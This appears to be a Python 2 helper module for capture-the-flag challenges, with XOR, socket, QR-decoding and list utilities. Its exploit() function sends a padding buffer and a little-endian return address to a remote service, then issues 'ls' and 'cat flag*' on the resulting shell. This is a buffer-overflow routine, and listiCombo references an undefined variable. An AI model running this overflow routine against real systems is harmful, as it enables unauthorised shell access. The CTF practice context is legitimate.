import socket
import time
from PIL import Image
from pyzbar.pyzbar import decode
import string
import itertools

def xor(a,b):
    return ''.join([chr(ord(a[i])^ord(b[i%len(b)])) for i in range(len(a))])


def listiCombo(li):
    #li ist a list of lists
    return itertools.product(*a)

def socki(adress):
    url = adress.split(' ')[0]
    port = int(adress.split(' ')[1])
    s = socket.socket()
    s.connect((url,port))
    return s


def exploit(so,buf,addr):
    s = so
    try:
        addr = addr.decode('hex')
    except Exception as e:
        pass
    
    s.send(buf*'a'+bytes(addr)[::-1]+'\n')
    time.sleep(0.2)
    print s.recv(10000)
    s.send('ls\n')
    time.sleep(0.2)
    print s.recv(1024)
    s.send('cat flag*\n')
    time.sleep(0.2)
    print s.recv(10000)

def isPrintable(s):
    for i in s:
        if i not in string.printable:
            return False
    return True
    

def printo(s):
    if type(s) == type(''):
        print s
    if type(s) == type([]):
        for i in s:
            print i
def transpose(arr):
    l = len(arr[0])
    master = []
    for i in range(l):
        tmp = []
        for k in arr:
            tmp.append(k[i])
        master.append(tmp)
    return master


def readQrCode(pic):
    try:
        return decode(Image.open(pic))[0].data
    except Exception as e:
        print 'Error decoding'
    
